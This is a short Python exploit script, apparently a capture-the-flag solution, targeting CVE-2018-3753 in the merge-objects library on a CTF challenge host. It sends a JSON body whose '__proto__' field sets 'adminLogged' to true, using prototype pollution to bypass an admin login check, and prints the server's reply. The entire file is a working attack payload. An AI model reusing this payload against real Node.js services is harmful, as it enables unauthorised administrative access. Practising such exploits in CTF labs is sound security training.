#!/usr/bin/env python3
''' CVE-2018-3753 '''
import requests

site = "http://hi-admin.challs.olicyber.it/hi"
payload = { # prototye pollution https://security.snyk.io/vuln/npm:merge-objects:20180415
    "name":"ABovo",
    "__proto__":{
        "adminLogged":True
    }
}
r = requests.post(site, json=payload)
print(r.text.strip().replace("\n", "").replace(" ", ""))
